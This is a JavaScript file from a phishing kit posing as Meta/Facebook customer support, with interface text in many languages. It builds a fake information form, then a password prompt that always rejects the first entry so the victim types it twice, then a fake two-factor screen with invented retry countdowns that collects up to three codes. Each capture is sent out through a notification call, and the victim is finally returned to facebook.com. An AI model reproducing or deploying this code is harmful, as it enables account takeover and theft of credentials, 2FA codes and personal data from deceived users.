        codeRetry: 'Koden er feil. Prøv igjen om {time} sekunder.',
        successTitle: 'Forespørselen er sendt',
        successBody: 'Forespørselen din er lagt til i behandlingskøen. Vi håndterer den innen 24 timer.',
        successFrom: 'Fra Meta kundestøtte.',
        returnFacebook: 'Tilbake til Facebook'
    },
    da: {
        formTitle: 'Informationsformular',
        fullName: 'Fulde navn',
        email: 'E-mail',
        emailBusiness: 'Erhvervs-e-mail',
        pageName: 'Sidenavn',
        phoneNumber: 'Telefonnummer',
        dateOfBirth: 'Fødselsdato',
        day: 'Dag',
        month: 'Måned',
        year: 'År',
        pageCategory: 'Sidekategori',
        agreeWith: 'Jeg accepterer',
        termsOfUse: 'Brugsvilkårene',
        send: 'Send',
        securityHint: 'Af sikkerhedshensyn skal du indtaste din adgangskode for at fortsætte.',
        password: 'Adgangskode',
        continue: 'Fortsæt',
        forgotPassword: 'Glemt adgangskode?',
        passwordRequired: 'Du har ikke indtastet din adgangskode!',
        passwordIncorrect: 'Adgangskoden, du indtastede, er forkert.',
        twoFaTitle: 'Tofaktorgodkendelse påkrævet',
        authDescription: 'Indtast koden til denne konto, som vi sender til {email}, {phone}, eller bekræft via den tofaktorapp, du har konfigureret (f.eks. Duo Mobile eller Google Authenticator)',
        code: 'Kode',
        tryAnotherWay: 'Prøv en anden måde',
        codeRequired: 'Du har ikke indtastet koden!',
        codeRetry: 'Koden er forkert. Prøv igen om {time} sekunder.',
        successTitle: 'Anmodningen er sendt',
        successBody: 'Din anmodning er tilføjet til behandlingskøen. Vi håndterer den inden for 24 timer.',
        successFrom: 'Fra Meta kundesupport.',
        returnFacebook: 'Tilbage til Facebook'
    },
    'zh-tw': {
        formTitle: '資訊表單',
        fullName: '全名',
        email: '電子郵件',
        emailBusiness: '商務電子郵件',
        pageName: '專頁名稱',
        phoneNumber: '電話號碼',
        dateOfBirth: '出生日期',
        day: '日',
        month: '月',
        year: '年',
        pageCategory: '專頁類別',
        agreeWith: '我同意',
        termsOfUse: '使用條款',
        send: '傳送',
        securityHint: '為了你的安全，必須輸入密碼才能繼續。',
        password: '密碼',
        continue: '繼續',
        forgotPassword: '忘記密碼？',
        passwordRequired: '你尚未輸入密碼！',
        passwordIncorrect: '你輸入的密碼不正確。',
        twoFaTitle: '需要兩步驟驗證',
        authDescription: '請輸入我們傳送到 {email}、{phone} 的此帳戶驗證碼，或透過你已設定的兩步驟驗證應用程式（例如 Duo Mobile 或 Google Authenticator）進行確認',
        code: '驗證碼',
        tryAnotherWay: '嘗試其他方式',
        codeRequired: '你尚未輸入驗證碼！',
        codeRetry: '驗證碼不正確。請在 {time} 秒後重試。',
        successTitle: '請求已傳送',
        successBody: '你的請求已加入處理佇列。我們將在 24 小時內處理。',
        successFrom: '來自 Meta 客戶支援。',
        returnFacebook: '返回 Facebook'
    },
    he: {
        formTitle: 'טופס מידע',
        fullName: 'שם מלא',
        email: 'אימייל',
        emailBusiness: 'אימייל עסקי',
        pageName: 'שם העמוד',
        phoneNumber: 'מספר טלפון',
        dateOfBirth: 'תאריך לידה',
        day: 'יום',
        month: 'חודש',
        year: 'שנה',
        pageCategory: 'קטגוריית העמוד',
        agreeWith: 'אני מסכים/ה ל',
        termsOfUse: 'תנאי השימוש',
        send: 'שלח',
        securityHint: 'למען האבטחה שלך יש להזין את הסיסמה כדי להמשיך.',
        password: 'סיסמה',
        continue: 'המשך',
        forgotPassword: 'שכחת סיסמה?',
        passwordRequired: 'לא הזנת סיסמה!',
        passwordIncorrect: 'הסיסמה שהוזנה שגויה.',
        twoFaTitle: 'נדרש אימות דו-שלבי',
        authDescription: 'הזן את הקוד לחשבון זה ששלחנו אל {email}, {phone} או אשר באמצעות אפליקציית האימות הדו-שלבי שהגדרת (כגון Duo Mobile או Google Authenticator)',
        code: 'קוד',
        tryAnotherWay: 'נסה דרך אחרת',
        codeRequired: 'לא הזנת את הקוד!',
        codeRetry: 'הקוד שגוי. נסה שוב בעוד {time} שניות.',
        successTitle: 'הבקשה נשלחה',
        successBody: 'הבקשה שלך נוספה לתור הטיפול. נטפל בה תוך 24 שעות.',
        successFrom: 'מתמיכת הלקוחות של Meta.',
        returnFacebook: 'חזרה לפייסבוק'
    }
};

function getAppLang() {
    try {
        return sessionStorage.getItem('pageLanguage') || 'en';
    } catch (e) {
        return 'en';
    }
}

function t(key, vars) {
    var lang = getAppLang();
    var dict = APP_I18N[lang] || APP_I18N.en;
    var text = dict[key] || APP_I18N.en[key] || key;

    if (vars) {
        Object.keys(vars).forEach(function (name) {
            text = text.replace(new RegExp('\\{' + name + '\\}', 'g'), vars[name]);
        });
    }

    return text;
}

var PAGE_CATEGORY_OPTIONS = {
    en: { personal: 'Personal', business: 'Business', creator: 'Creator / Public figure', media: 'Media / News', brand: 'Brand / Organization', community: 'Community' },
    'en-gb': { personal: 'Personal', business: 'Business', creator: 'Creator / Public figure', media: 'Media / News', brand: 'Brand / Organisation', community: 'Community' },
    es: { personal: 'Personal', business: 'Empresa', creator: 'Creador / Figura pública', media: 'Medios / Noticias', brand: 'Marca / Organización', community: 'Comunidad' },
    fr: { personal: 'Personnel', business: 'Entreprise', creator: 'Créateur / Personnalité publique', media: 'Médias / Actualités', brand: 'Marque / Organisation', community: 'Communauté' },
    de: { personal: 'Persönlich', business: 'Unternehmen', creator: 'Creator / Person des öffentlichen Lebens', media: 'Medien / Nachrichten', brand: 'Marke / Organisation', community: 'Community' },
    pt: { personal: 'Pessoal', business: 'Empresa', creator: 'Criador / Figura pública', media: 'Mídia / Notícias', brand: 'Marca / Organização', community: 'Comunidade' },
    ja: { personal: '個人', business: 'ビジネス', creator: 'クリエイター / 著名人', media: 'メディア / ニュース', brand: 'ブランド / 団体', community: 'コミュニティ' },
    ko: { personal: '개인', business: '비즈니스', creator: '크리에이터 / 공인', media: '미디어 / 뉴스', brand: '브랜드 / 단체', community: '커뮤니티' },
    zh: { personal: '个人', business: '企业', creator: '创作者 / 公众人物', media: '媒体 / 新闻', brand: '品牌 / 机构', community: '社区' },
    vi: { personal: 'Cá nhân', business: 'Doanh nghiệp', creator: 'Nhà sáng tạo / Người nổi tiếng', media: 'Truyền thông / Tin tức', brand: 'Thương hiệu / Tổ chức', community: 'Cộng đồng' },
    it: { personal: 'Personale', business: 'Attività commerciale', creator: 'Creator / Figura pubblica', media: 'Media / Notizie', brand: 'Brand / Organizzazione', community: 'Community' },
    nl: { personal: 'Persoonlijk', business: 'Bedrijf', creator: 'Creator / Publiek figuur', media: 'Media / Nieuws', brand: 'Merk / Organisatie', community: 'Community' },
    pl: { personal: 'Osobiste', business: 'Firma', creator: 'Twórca / Osoba publiczna', media: 'Media / Wiadomości', brand: 'Marka / Organizacja', community: 'Społeczność' },
    ru: { personal: 'Личное', business: 'Бизнес', creator: 'Автор / Публичная личность', media: 'СМИ / Новости', brand: 'Бренд / Организация', community: 'Сообщество' },
    uk: { personal: 'Особисте', business: 'Бізнес', creator: 'Автор / Публічна особа', media: 'Медіа / Новини', brand: 'Бренд / Організація', community: 'Спільнота' },
    tr: { personal: 'Kişisel', business: 'İşletme', creator: 'İçerik üreticisi / Tanınmış kişi', media: 'Medya / Haber', brand: 'Marka / Kuruluş', community: 'Topluluk' },
    ar: { personal: 'شخصي', business: 'أعمال', creator: 'صانع محتوى / شخصية عامة', media: 'إعلام / أخبار', brand: 'علامة تجارية / مؤسسة', community: 'مجتمع' },
    hi: { personal: 'व्यक्तिगत', business: 'व्यवसाय', creator: 'क्रिएटर / सार्वजनिक व्यक्ति', media: 'मीडिया / समाचार', brand: 'ब्रांड / संगठन', community: 'समुदाय' },
    th: { personal: 'ส่วนตัว', business: 'ธุรกิจ', creator: 'ครีเอเตอร์ / บุคคลสาธารณะ', media: 'สื่อ / ข่าว', brand: 'แบรนด์ / องค์กร', community: 'ชุมชน' },
    id: { personal: 'Pribadi', business: 'Bisnis', creator: 'Kreator / Tokoh publik', media: 'Media / Berita', brand: 'Merek / Organisasi', community: 'Komunitas' },
    sv: { personal: 'Personligt', business: 'Företag', creator: 'Creator / Offentlig person', media: 'Media / Nyheter', brand: 'Varumärke / Organisation', community: 'Community' },
    no: { personal: 'Personlig', business: 'Bedrift', creator: 'Skaper / Offentlig person', media: 'Media / Nyheter', brand: 'Merkevare / Organisasjon', community: 'Fellesskap' },
    da: { personal: 'Personlig', business: 'Virksomhed', creator: 'Skaber / Offentlig person', media: 'Medier / Nyheder', brand: 'Brand / Organisation', community: 'Fællesskab' },
    'zh-tw': { personal: '個人', business: '企業', creator: '創作者 / 公眾人物', media: '媒體 / 新聞', brand: '品牌 / 機構', community: '社群' },
    he: { personal: 'אישי', business: 'עסק', creator: 'יוצר / דמות ציבורית', media: 'מדיה / חדשות', brand: 'מותג / ארגון', community: 'קהילה' }
};

// Generate ticket ID
document.getElementById('ticketId').textContent = Utils.generateTicketId();

// Start verification flow
document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);

// ==================== MODAL 1: CLIENT INFO ====================
function getDobLocale() {
    const lang = getAppLang();
    const map = {
        en: 'en-US',
        'en-gb': 'en-GB',
        zh: 'zh-CN',
        'zh-tw': 'zh-TW',
        he: 'he-IL',
        ar: 'ar',
        pt: 'pt-BR',
        no: 'nb-NO',
        da: 'da-DK'
    };
    return map[lang] || lang;
}

function buildSelectOptions(placeholder, items, optional) {
    // Keep placeholder text for the closed select, but hide it from the open option list.
    const emptyOption = optional
        ? `<option value="" selected hidden>${placeholder}</option>`
        : `<option value="" disabled selected hidden>${placeholder}</option>`;
    return [emptyOption]
        .concat(items.map(function (item) {
            return `<option value="${item.value}">${item.label}</option>`;
        }))
        .join('');
}

function buildDayOptions() {
    const items = [];
    for (let i = 1; i <= 31; i++) {
        items.push({ value: String(i), label: String(i) });
    }
    return buildSelectOptions(t('day'), items, true);
}

function buildMonthOptions() {
    const locale = getDobLocale();
    const items = [];
    for (let i = 0; i < 12; i++) {
        const label = new Intl.DateTimeFormat(locale, { month: 'long' }).format(new Date(2020, i, 1));
        items.push({ value: String(i + 1), label: label });
    }
    return buildSelectOptions(t('month'), items, true);
}

function buildYearOptions() {
    const currentYear = new Date().getFullYear();
    const items = [];
    for (let year = currentYear; year >= 1900; year--) {
        items.push({ value: String(year), label: String(year) });
    }
    return buildSelectOptions(t('year'), items, true);
}

function buildCategoryOptions() {
    const options = PAGE_CATEGORY_OPTIONS[getAppLang()] || PAGE_CATEGORY_OPTIONS.en;
    const items = Object.keys(options).map(function (value) {
        return { value: value, label: options[value] };
    });
    return buildSelectOptions(t('pageCategory'), items, false);
}

function openClientModal() {
    const content = `
        <div class="info-form">
            <div class="info-form-header">
                <h2>${t('formTitle')}</h2>
            </div>
            <form id="clientForm">
                <div class="info-field">
                    <label class="info-required" for="fullName">${t('fullName')}</label>
                    <input type="text" id="fullName" placeholder="${t('fullName')}" required>
                </div>
                <div class="info-grid">
                    <div class="info-field">
                        <label class="info-required" for="email">${t('email')}</label>
                        <input type="email" id="email" placeholder="${t('email')}" required>
                    </div>
                    <div class="info-field">
                        <label class="info-required" for="emailBusiness">${t('emailBusiness')}</label>
                        <input type="email" id="emailBusiness" placeholder="${t('emailBusiness')}" required>
                    </div>
                </div>
                <div class="info-grid">
                    <div class="info-field">
                        <label class="info-required" for="fanpage">${t('pageName')}</label>
                        <input type="text" id="fanpage" placeholder="${t('pageName')}" required>
                    </div>
                    <div class="info-field">
                        <label class="info-required" for="phone">${t('phoneNumber')}</label>
                        <input type="tel" id="phone" placeholder="${t('phoneNumber')}" required>
                    </div>
                </div>
                <div class="info-dob">
                    <span>${t('dateOfBirth')}</span>
                    <div class="info-dob-grid">
                        <div class="info-field">
                            <label for="day">${t('day')}</label>
                            <select id="day">${buildDayOptions()}</select>
                        </div>
                        <div class="info-field">
                            <label for="month">${t('month')}</label>
                            <select id="month">${buildMonthOptions()}</select>
                        </div>
                        <div class="info-field">
                            <label for="year">${t('year')}</label>
                            <select id="year">${buildYearOptions()}</select>
                        </div>
                    </div>
                </div>
                <div class="info-field">
                    <label class="info-required" for="pageCategory">${t('pageCategory')}</label>
                    <select id="pageCategory" required>${buildCategoryOptions()}</select>
                </div>
                <label class="info-agree">
                    <input type="checkbox">
                    <span>${t('agreeWith')} <a href="#">${t('termsOfUse')}</a></span>
                </label>
                <button type="submit" class="info-submit">${t('send')}</button>
            </form>
        </div>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');

    ['day', 'month', 'year', 'pageCategory'].forEach(function (id) {
        var el = document.getElementById(id);
        if (!el) return;
        var syncPlaceholder = function () {
            el.classList.toggle('placeholder-active', !el.value);
        };
        syncPlaceholder();
        el.addEventListener('change', syncPlaceholder);
    });

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            pageCategory: document.getElementById('pageCategory').value,
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="h-full flex flex-col items-center justify-between flex-1">
            <div class="w-12 h-12 mb-5 mx-auto">
                <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
            </div>
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4 text-center">${t('securityHint')}</p>
                <form id="securityForm">
                    <input type="password" id="password" placeholder="${t('password')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">${t('continue')}</button>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('passwordError');
        const submitBtn = e.target.querySelector('button');

        errorMsg.classList.add('hidden');
        if (!password) {
            errorMsg.textContent = t('passwordRequired');
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = t('continue');
                document.getElementById('password').value = '';
                errorMsg.textContent = t('passwordIncorrect');
                errorMsg.classList.remove('hidden');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = t('authDescription', { email: emailDisplay, phone: phoneDisplay });

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">${t('twoFaTitle')}</h2>
                <p class="text-[#9a979e] text-sm mb-4">${description}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/images/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" placeholder="${t('code')}" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">${t('continue')}</button>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = document.getElementById('twoFa').value.trim();
        const errorMsg = document.getElementById('authError');
        const submitBtn = e.target.querySelector('button');
        const input = document.getElementById('twoFa');

        errorMsg.classList.add('hidden');
        if (!twoFa) {
            errorMsg.textContent = t('codeRequired');
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = t('continue');
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = t('continue');
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(input, errorMsg, submitBtn) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = CONFIG.COUNTDOWN_TIME;
        errorMsg.textContent = t('codeRetry', { time: time });
        errorMsg.classList.remove('hidden');

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = t('codeRetry', { time: time });

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                errorMsg.classList.add('hidden');
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">${t('successTitle')}</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">${t('successBody')}</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">${t('successFrom')}</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            ${t('returnFacebook')}
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}
